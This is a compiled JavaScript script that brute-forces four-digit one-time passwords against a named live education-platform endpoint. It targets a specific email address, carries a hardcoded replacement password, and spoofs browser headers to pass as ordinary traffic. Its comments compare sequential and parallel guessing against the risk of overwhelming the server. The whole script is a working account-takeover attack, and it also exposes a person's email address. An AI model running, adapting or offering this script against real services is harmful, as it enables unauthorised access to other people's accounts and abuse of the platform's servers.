"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendrequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = JSON.stringify({
            email: "chandankr824142@gmail.com",
            otp: otp,
            newPassword: "76348425"
        });
        let config = {
            method: 'get',
            maxBodyLength: Infinity,
            url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=chandankr824142%40gmail.com' + otp,
            headers: {
                'accept': '*/*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'auth-key': 'appxapi',
                'cache-control': 'no-cache',
                'client-service': 'Appx',
                'device-type': '',
                'origin': 'https://harkirat.classx.co.in',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://harkirat.classx.co.in/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'source': 'website',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
            }
        };
        try {
            yield axios_1.default.request(config);
            console.log("Success for OTP: " + otp);
            return true; // Return true if successful
        }
        catch (e) {
            console.log("Failed for OTP: " + otp);
            return false;
        }
    });
}
// Sequential approach (slower but less likely to overwhelm server)
// async function main() {
//   for(let i = 1000; i <= 9999; i++) {
//     console.log("Trying OTP:", i);
//     const success = await sendrequest(i.toString());
//     if (success) {
//       console.log("SUCCESS! OTP found:", i);
//       break; // Stop when successful
//     }
//   }
// }
// Parallel approach (faster but may overwhelm server)
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 1000; i < 10000; i++) {
            const promises = [];
            console.log("Batch starting at:", i);
            promises.push(sendrequest((i).toString()));
            const results = yield Promise.all(promises);
            // Check if any succeeded
            const successIndex = results.findIndex(result => result === true);
            if (successIndex !== -1) {
                console.log("SUCCESS! OTP found:", i + successIndex);
                break;
            }
        }
    });
}
// Call the function to start execution
main(); // Use mainParallel() for faster execution
